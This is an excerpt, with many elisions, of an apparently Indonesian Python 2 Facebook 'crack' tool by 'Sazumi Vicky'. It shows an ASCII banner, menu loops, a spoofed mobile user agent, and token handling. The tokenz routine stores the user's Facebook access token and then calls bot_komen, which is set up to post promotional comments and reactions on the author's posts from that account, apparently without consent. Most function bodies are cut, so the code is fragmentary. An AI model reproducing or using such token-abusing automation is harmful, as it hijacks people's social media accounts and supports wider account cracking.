...
br.addheaders = [('Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1')]
...
\33[37;1m██████╔╝██║░░██║███████╗╚██████╔╝██║░╚═╝░██║██║
\33[37;1m╚═════╝░╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;41;97m Sazumi Vicky XD.\033[0m
 """
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def pilih_masuk():
	...
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Salah"
		pilih_masuk()
...
def tokenz():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97m JANGAN LUPA FOLLOW AKUN SAZUMI VICKY')
		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Berhasil'
		os.system('xdg-open  https://www.facebook.com/SazumiVicky09')
		bot_komen()
	except KeyError:
...
def bot_komen():
	...
	una = ('100015646233405')
	kom = ('Sazumi Vicky Best Scrip 😘😘')
	reac = ('ANGRY')
	post = ('941318426399690')
	post2 = ('941318426399690')
	kom2 = ('Sazumi Vicky Best Scrip😘😘')
	reac2 = ('LOVE')
...
def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mSalah"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
...
def pilih_super():
	...
	if peak =="":
		...
		print "\033[1;96m[!] \x1b[1;91mPengisian Salah"
		pilih_super()
